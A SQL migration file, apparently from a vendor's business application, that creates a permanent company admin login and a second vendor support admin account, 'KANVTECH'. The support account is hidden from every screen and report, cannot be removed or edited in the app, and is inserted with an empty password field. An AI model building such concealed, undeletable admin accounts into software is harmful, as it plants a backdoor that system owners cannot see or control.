-- Migration: 007_permanent_and_support_logins.sql
-- Two logins that always exist and can't be removed from the app:
--
--   ADMIN     the company's main admin. Permanent: can't be deleted, deactivated or lose admin.
--             Its password can be changed on Admin > Create Login.
--   KANVTECH  our support login (Kanvtech). Permanent AND hidden: it never shows on any screen,
--             list or report, and can't be opened or changed from the app.
--             Its password is stored only as a hash (login.passwordhash), never as plain text.
--             It starts WITHOUT a password, so nobody can log in with it until we set one with
--             the support tool:  node server/tools/garmentmfg-support.js set-support-password
--
-- New columns:
--   login.permanent     'YES' = can't be deleted / deactivated / un-admined
--   login.hidden        'YES' = not shown anywhere in the app
--   login.passwordhash  hashed password (used instead of login.password when set)
--   operatormaster.hidden  'YES' = employee record not shown anywhere (the support login's employee)

ALTER TABLE login ADD COLUMN IF NOT EXISTS permanent varchar(3) NOT NULL DEFAULT 'NO';
ALTER TABLE login ADD COLUMN IF NOT EXISTS hidden varchar(3) NOT NULL DEFAULT 'NO';
ALTER TABLE login ADD COLUMN IF NOT EXISTS passwordhash varchar(300);
ALTER TABLE operatormaster ADD COLUMN IF NOT EXISTS hidden varchar(3) NOT NULL DEFAULT 'NO';

-- ADMIN: permanent, always an active admin
UPDATE login l SET permanent = 'YES', isadmin = 'YES', isactive = 'YES', role = 'admin'
FROM operatormaster o
WHERE o.id = l.empid AND UPPER(TRIM(o.empcode)) = 'ADMIN';

-- KANVTECH: hidden employee (in ADMIN's group) + hidden permanent admin login, no password yet
INSERT INTO operatormaster (operatorname, empcode, empgrp, contactno, isdeleted, enterby, createdon, hidden)
SELECT 'Kanvtech Support', 'KANVTECH', a.empgrp, '0000000000', 'NO', 'setup', NOW(), 'YES'
FROM operatormaster a
WHERE UPPER(TRIM(a.empcode)) = 'ADMIN'
  AND NOT EXISTS (SELECT 1 FROM operatormaster WHERE UPPER(TRIM(empcode)) = 'KANVTECH')
LIMIT 1;

INSERT INTO login (loginid, password, role, empid, isadmin, isactive, rights, permanent, hidden)
SELECT 'KANVTECH', '', 'admin', o.id, 'YES', 'YES', '{}'::jsonb, 'YES', 'YES'
FROM operatormaster o
WHERE UPPER(TRIM(o.empcode)) = 'KANVTECH'
  AND NOT EXISTS (SELECT 1 FROM login l WHERE l.empid = o.id);
